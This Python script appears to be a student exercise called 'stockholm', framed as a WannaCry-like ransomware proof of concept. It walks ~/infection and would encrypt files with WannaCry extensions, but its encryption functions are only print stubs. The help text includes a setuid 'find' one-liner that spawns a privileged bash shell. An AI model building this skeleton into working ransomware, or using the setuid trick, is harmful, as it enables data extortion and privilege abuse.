#!/usr/bin/env python3

import os
import argparse
from Crypto.Cipher import AES

__version__ = '0.1'
__author__ = 'tischmid@student.42berlin.de'
__copyright__ = 'Copyright (c) 2024 tischmid@student.42berlin.de'
__license__ = '''\
The MIT License (MIT)

Copyright (c) 2024 tischmid@student.42berlin.de

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''
SILENT = False
WANNACRY_EXTENSIONS = {'.wnry', '.wcry', '.wncry', '.wncryt'}

def log(msg: str, level: str = 'INFO', force_print=False) -> None:
    if not SILENT or force_print:
        level = level.upper().strip()
        if level == 'INFO':
            clr = '0'
        elif level == 'WARNING':
            clr = '33'
        elif level == 'ERROR':
            clr = '31'
        if level == 'SUCCESS':
            clr = '32'
        print(f'\033[{clr}m{level}: {msg}\033[m')

def encrypt_file(file_path: str, key: str):
    print(f'Encrypting file "{file_path}" with key "{key}"')

def decrypt_file(file_path: str, key: str):
    print(f'Decrypting file "{file_path}" with key "{key}"')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='stockholm',
        description='WannaCry like ransomware POC - run at your own risk',
        usage='%(prog)s [options] <key>',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''\
IMPORTANT NOTICE:
Running this program will ENCRYPT (or decrypt if -r/--reverse is specified) ALL REGULAR FILES ENDING IN
`.wnry', `.wcry', `.wncry', `.wncryt' in the folder called `infection' inside the HOME directory of
the user whose UID is the same as the REAL UID that is running this program, using AES-256-CBC with KEY
E.g.:
    - $ $(prog)s      will encrypt files in ~/infection,
    - $ sudo $(prog)s will encrypt files in ~root/infection,
    - $ sudo cp $(which find) ~/find && sudo chmod u+s ~/find && ~/find -exec bash -p -c '%(prog)s' \; -quit ; sudo rm -f ~/find
        - will encrypt files in ~/infection, although it's run with root privileges
        '''
    )

    parser.add_argument('key', help='The 16 character (or more) key used for encryption or decryption')
    parser.add_argument('-v', '--version', action='version', version=f'%(prog)s {__version__}')
    parser.add_argument('-r', '--reverse', action='store_true', help='Decrypt files using KEY (instead of encrypting)')
    parser.add_argument('-s', '--silent', action='store_true', help='Do not print which files were encrypted/decrypted')
    args = parser.parse_args()

    SILENT = args.silent
    key = args.key
    if len(key) < 16:
        log(f'Key "{key}" must be at least 16 characters', 'ERROR', force_print=True)
        raise SystemExit(1)
    users_home = os.path.expanduser('~')
    crypt_path = os.path.join(users_home, 'infection')
    if not os.path.isdir(crypt_path):
        log(f'Directory "{crypt_path}" does not exist', 'ERROR', force_print=True)
        raise SystemExit(1)
    for root, dirs, files in os.walk(crypt_path):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                if file_path.endswith(tuple(WANNACRY_EXTENSIONS)):
                    if args.reverse:
                        decrypt_file(file_path, key)
                    else:
                        encrypt_file(file_path, key)
